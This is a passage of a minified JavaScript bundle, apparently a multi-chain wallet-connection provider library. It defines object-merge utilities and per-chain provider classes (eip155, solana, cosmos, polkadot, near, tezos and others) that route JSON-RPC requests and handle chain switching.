r=="object"&&Eie(r)==="[object Arguments]"}function cH(r){return typeof r=="object"&&r!==null}function mGe(){}function wGe(r){return BO(r)}function bGe(r){if(typeof r!="object"||r==null)return!1;if(Object.getPrototypeOf(r)===null)return!0;if(Object.prototype.toString.call(r)!=="[object Object]"){const t=r[Symbol.toStringTag];return t==null||!Object.getOwnPropertyDescriptor(r,Symbol.toStringTag)?.writable?!1:r.toString()===`[object ${t}]`}let e=r;for(;Object.getPrototypeOf(e)!==null;)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(r)===e}function vGe(r){if(OO(r))return r;if(Array.isArray(r)||BO(r)||r instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&r instanceof SharedArrayBuffer)return r.slice(0);const e=Object.getPrototypeOf(r),t=e.constructor;if(r instanceof Date||r instanceof Map||r instanceof Set)return new t(r);if(r instanceof RegExp){const i=new t(r);return i.lastIndex=r.lastIndex,i}if(r instanceof DataView)return new t(r.buffer.slice(0));if(r instanceof Error){const i=new t(r.message);return i.stack=r.stack,i.name=r.name,i.cause=r.cause,i}if(typeof File<"u"&&r instanceof File)return new t([r],r.name,{type:r.type,lastModified:r.lastModified});if(typeof r=="object"){const i=Object.create(e);return Object.assign(i,r)}return r}function yGe(r,...e){const t=e.slice(0,-1),i=e[e.length-1];let n=r;for(let s=0;s<t.length;s++){const o=t[s];n=GN(n,o,i,new Map)}return n}function GN(r,e,t,i){if(OO(r)&&(r=Object(r)),e==null||typeof e!="object")return r;if(i.has(e))return vGe(i.get(e));if(i.set(e,r),Array.isArray(e)){e=e.slice();for(let s=0;s<e.length;s++)e[s]=e[s]??void 0}const n=[...Object.keys(e),...Cie(e)];for(let s=0;s<n.length;s++){const o=n[s];let a=e[o],c=r[o];if(aH(a)&&(a={...a}),aH(c)&&(c={...c}),typeof Buffer<"u"&&Buffer.isBuffer(a)&&(a=oH(a)),Array.isArray(a))if(typeof c=="object"&&c!=null){const u=[],d=Reflect.ownKeys(c);for(let h=0;h<d.length;h++){const f=d[h];u[f]=c[f]}c=u}else c=[];const l=t(c,a,o,r,e,i);l!=null?r[o]=l:Array.isArray(a)||cH(c)&&cH(a)?r[o]=GN(c,a,t,i):c==null&&bGe(a)?r[o]=GN({},a,t,i):c==null&&wGe(a)?r[o]=oH(a):(c===void 0||a!==void 0)&&(r[o]=a)}return r}function xGe(r,...e){return yGe(r,...e,mGe)}var CGe=Object.defineProperty,EGe=Object.defineProperties,_Ge=Object.getOwnPropertyDescriptors,lH=Object.getOwnPropertySymbols,SGe=Object.prototype.hasOwnProperty,AGe=Object.prototype.propertyIsEnumerable,uH=(r,e,t)=>e in r?CGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,v8=(r,e)=>{for(var t in e||(e={}))SGe.call(e,t)&&uH(r,t,e[t]);if(lH)for(var t of lH(e))AGe.call(e,t)&&uH(r,t,e[t]);return r},IGe=(r,e)=>EGe(r,_Ge(e));function xc(r,e,t){var i;const n=uw(r);return((i=e.rpcMap)==null?void 0:i[n.reference])||`${xie}?chainId=${n.namespace}:${n.reference}&projectId=${t}`}function E2(r){return r.includes(":")?r.split(":")[1]:r}function Tie(r){return r.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function TGe(r,e){const t=Object.keys(e.namespaces).filter(n=>n.includes(r));if(!t.length)return[];const i=[];return t.forEach(n=>{const s=e.namespaces[n].accounts;i.push(...s)}),i}function dH(r){return Object.fromEntries(Object.entries(r).filter(([e,t])=>{var i,n;return((i=t?.chains)==null?void 0:i.length)&&((n=t?.chains)==null?void 0:n.length)>0}))}function y8(r={},e={}){const t=dH(hH(r)),i=dH(hH(e));return xGe(t,i)}function hH(r){var e,t,i,n,s;const o={};if(!Ed(r))return o;for(const[a,c]of Object.entries(r)){const l=eE(a)?[a]:c.chains,u=c.methods||[],d=c.events||[],h=c.rpcMap||{},f=Gm(a);o[f]=IGe(v8(v8({},o[f]),c),{chains:Cd(l,(e=o[f])==null?void 0:e.chains),methods:Cd(u,(t=o[f])==null?void 0:t.methods),events:Cd(d,(i=o[f])==null?void 0:i.events)}),(Ed(h)||Ed(((n=o[f])==null?void 0:n.rpcMap)||{}))&&(o[f].rpcMap=v8(v8({},h),(s=o[f])==null?void 0:s.rpcMap))}return o}function fH(r){return r.includes(":")?r.split(":")[2]:r}function pH(r){const e={};for(const[t,i]of Object.entries(r)){const n=i.methods||[],s=i.events||[],o=i.accounts||[],a=eE(t)?[t]:i.chains?i.chains:Tie(i.accounts);e[t]={chains:a,methods:n,events:s,accounts:o}}return e}function vI(r){return typeof r=="number"?r:r.includes("0x")?parseInt(r,16):(r=r.includes(":")?r.split(":")[1]:r,isNaN(Number(r))?r:Number(r))}const kie={},xi=r=>kie[r],yI=(r,e)=>{kie[r]=e};var kGe=Object.defineProperty,gH=Object.getOwnPropertySymbols,NGe=Object.prototype.hasOwnProperty,PGe=Object.prototype.propertyIsEnumerable,mH=(r,e,t)=>e in r?kGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,wH=(r,e)=>{for(var t in e||(e={}))NGe.call(e,t)&&mH(r,t,e[t]);if(gH)for(var t of gH(e))PGe.call(e,t)&&mH(r,t,e[t]);return r};const bH="eip155",$Ge=["atomic","flow-control","paymasterService","sessionKeys","auxiliaryFunds"],RGe=r=>r&&r.startsWith("0x")?BigInt(r).toString(10):r,xI=r=>r&&r.startsWith("0x")?r:`0x${BigInt(r).toString(16)}`,vH=r=>Object.keys(r).filter(e=>$Ge.includes(e)).reduce((e,t)=>(e[t]=r[t],e),{}),OGe=(r,e,t)=>{const{sessionProperties:i={},scopedProperties:n={}}=r,s={};if(!Ed(n)&&!Ed(i))return;const o=vH(i);for(const a of t){const c=RGe(a);if(!c)continue;s[xI(c)]=o;const l=n?.[`${bH}:${c}`];if(l){const u=l?.[`${bH}:${c}:${e}`];s[xI(c)]=wH(wH({},s[xI(c)]),vH(u||l))}}for(const[a,c]of Object.entries(s))Object.keys(c).length===0&&delete s[a];return Object.keys(s).length>0?s:void 0};var BGe=Object.defineProperty,MGe=(r,e,t)=>e in r?BGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Z2=(r,e,t)=>MGe(r,typeof e!="symbol"?e+"":e,t);let DGe=class{constructor(e){Z2(this,"name","polkadot"),Z2(this,"client"),Z2(this,"httpProviders"),Z2(this,"events"),Z2(this,"namespace"),Z2(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=E2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var LGe=Object.defineProperty,UGe=Object.defineProperties,jGe=Object.getOwnPropertyDescriptors,yH=Object.getOwnPropertySymbols,FGe=Object.prototype.hasOwnProperty,qGe=Object.prototype.propertyIsEnumerable,ZN=(r,e,t)=>e in r?LGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,xH=(r,e)=>{for(var t in e||(e={}))FGe.call(e,t)&&ZN(r,t,e[t]);if(yH)for(var t of yH(e))qGe.call(e,t)&&ZN(r,t,e[t]);return r},CH=(r,e)=>UGe(r,jGe(e)),Y2=(r,e,t)=>ZN(r,typeof e!="symbol"?e+"":e,t);let zGe=class{constructor(e){Y2(this,"name","eip155"),Y2(this,"client"),Y2(this,"chainId"),Y2(this,"namespace"),Y2(this,"httpProviders"),Y2(this,"events"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(parseInt(e),t),this.chainId=parseInt(e),this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,t){const i=t||xc(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=parseInt(E2(t));e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}getHttpProvider(){const e=this.chainId,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}async handleSwitchChain(e){var t,i;let n=e.request.params?(t=e.request.params[0])==null?void 0:t.chainId:"0x0";n=n.startsWith("0x")?n:`0x${n}`;const s=parseInt(n,16);if(this.isChainApproved(s))this.setDefaultChain(`${s}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:n}]},chainId:(i=this.namespace.chains)==null?void 0:i[0]}),this.setDefaultChain(`${s}`);else throw new Error(`Failed to switch to chain 'eip155:${s}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var t,i,n,s,o;const a=(i=(t=e.request)==null?void 0:t.params)==null?void 0:i[0],c=((s=(n=e.request)==null?void 0:n.params)==null?void 0:s[1])||[];if(!a)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const l=this.client.session.get(e.topic),u=((o=l?.sessionProperties)==null?void 0:o.capabilities)||{},d=`${a}${c.join(",")}`,h=u?.[d];if(h)return h;let f;try{f=OGe(l,a,c)}catch(g){console.warn("Failed to extract capabilities from session",g)}if(f)return f;const p=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:CH(xH({},l.sessionProperties||{}),{capabilities:CH(xH({},u||{}),{[d]:p})})})}catch(g){console.warn("Failed to update session with capabilities",g)}return p}async getCallStatus(e){var t,i;const n=this.client.session.get(e.topic),s=(t=n.sessionProperties)==null?void 0:t.bundler_name;if(s){const a=this.getBundlerUrl(e.chainId,s);try{return await this.getUserOperationReceipt(a,e)}catch(c){console.warn("Failed to fetch call status from bundler",c,a)}}const o=(i=n.sessionProperties)==null?void 0:i.bundler_url;if(o)try{return await this.getUserOperationReceipt(o,e)}catch(a){console.warn("Failed to fetch call status from custom bundler",a,o)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,t){var i;const n=new URL(e),s=await fetch(n,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(jn("eth_getUserOperationReceipt",[(i=t.request.params)==null?void 0:i[0]]))});if(!s.ok)throw new Error(`Failed to fetch user operation receipt - ${s.status}`);return await s.json()}getBundlerUrl(e,t){return`${GKe}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${t}`}};var WGe=Object.defineProperty,HGe=(r,e,t)=>e in r?WGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,J2=(r,e,t)=>HGe(r,typeof e!="symbol"?e+"":e,t);let VGe=class{constructor(e){J2(this,"name","solana"),J2(this,"client"),J2(this,"httpProviders"),J2(this,"events"),J2(this,"namespace"),J2(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=E2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var KGe=Object.defineProperty,GGe=(r,e,t)=>e in r?KGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Q2=(r,e,t)=>GGe(r,typeof e!="symbol"?e+"":e,t);let ZGe=class{constructor(e){Q2(this,"name","cosmos"),Q2(this,"client"),Q2(this,"httpProviders"),Q2(this,"events"),Q2(this,"namespace"),Q2(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=E2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var YGe=Object.defineProperty,JGe=(r,e,t)=>e in r?YGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,X2=(r,e,t)=>JGe(r,typeof e!="symbol"?e+"":e,t);let QGe=class{constructor(e){X2(this,"name","algorand"),X2(this,"client"),X2(this,"httpProviders"),X2(this,"events"),X2(this,"namespace"),X2(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(!this.httpProviders[e]){const i=t||xc(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;e[t]=this.createHttpProvider(t,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);return typeof i>"u"?void 0:new Vr(new li(i,xi("disableProviderPing")))}};var XGe=Object.defineProperty,eZe=(r,e,t)=>e in r?XGe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,em=(r,e,t)=>eZe(r,typeof e!="symbol"?e+"":e,t);let tZe=class{constructor(e){em(this,"name","cip34"),em(this,"client"),em(this,"httpProviders"),em(this,"events"),em(this,"namespace"),em(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{const i=this.getCardanoRPCUrl(t),n=E2(t);e[n]=this.createHttpProvider(n,i)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}getCardanoRPCUrl(e){const t=this.namespace.rpcMap;if(t)return t[e]}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||this.getCardanoRPCUrl(e);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var rZe=Object.defineProperty,iZe=(r,e,t)=>e in r?rZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,tm=(r,e,t)=>iZe(r,typeof e!="symbol"?e+"":e,t);let nZe=class{constructor(e){tm(this,"name","elrond"),tm(this,"client"),tm(this,"httpProviders"),tm(this,"events"),tm(this,"namespace"),tm(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=E2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var sZe=Object.defineProperty,oZe=(r,e,t)=>e in r?sZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,rm=(r,e,t)=>oZe(r,typeof e!="symbol"?e+"":e,t);let aZe=class{constructor(e){rm(this,"name","multiversx"),rm(this,"client"),rm(this,"httpProviders"),rm(this,"events"),rm(this,"namespace"),rm(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;const n=E2(t);e[n]=this.createHttpProvider(n,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var cZe=Object.defineProperty,lZe=(r,e,t)=>e in r?cZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,im=(r,e,t)=>lZe(r,typeof e!="symbol"?e+"":e,t);let uZe=class{constructor(e){im(this,"name","near"),im(this,"client"),im(this,"httpProviders"),im(this,"events"),im(this,"namespace"),im(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const i=t||xc(`${this.name}:${e}`,this.namespace);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{var i;e[t]=this.createHttpProvider(t,(i=this.namespace.rpcMap)==null?void 0:i[t])}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace);return typeof i>"u"?void 0:new Vr(new li(i,xi("disableProviderPing")))}};var dZe=Object.defineProperty,hZe=(r,e,t)=>e in r?dZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,nm=(r,e,t)=>hZe(r,typeof e!="symbol"?e+"":e,t);let fZe=class{constructor(e){nm(this,"name","tezos"),nm(this,"client"),nm(this,"httpProviders"),nm(this,"events"),nm(this,"namespace"),nm(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const i=t||xc(`${this.name}:${e}`,this.namespace);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,i)}this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(t=>{e[t]=this.createHttpProvider(t)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace);return typeof i>"u"?void 0:new Vr(new li(i))}};var pZe=Object.defineProperty,gZe=(r,e,t)=>e in r?pZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,sm=(r,e,t)=>gZe(r,typeof e!="symbol"?e+"":e,t);let mZe=class{constructor(e){sm(this,"name",Um),sm(this,"client"),sm(this,"httpProviders"),sm(this,"events"),sm(this,"namespace"),sm(this,"chainId"),this.namespace=e.namespace,this.events=xi("events"),this.client=xi("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(El.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(t=>t.split(":")[1]===this.chainId.toString()).map(t=>t.split(":")[2]))]:[]}createHttpProviders(){var e,t;const i={};return(t=(e=this.namespace)==null?void 0:e.accounts)==null||t.forEach(n=>{const s=uw(n);i[`${s.namespace}:${s.reference}`]=this.createHttpProvider(n)}),i}getHttpProvider(e){const t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const i=this.createHttpProvider(e,t);i&&(this.httpProviders[e]=i)}createHttpProvider(e,t){const i=t||xc(e,this.namespace,this.client.core.projectId);if(!i)throw new Error(`No RPC url provided for chainId: ${e}`);return new Vr(new li(i,xi("disableProviderPing")))}};var 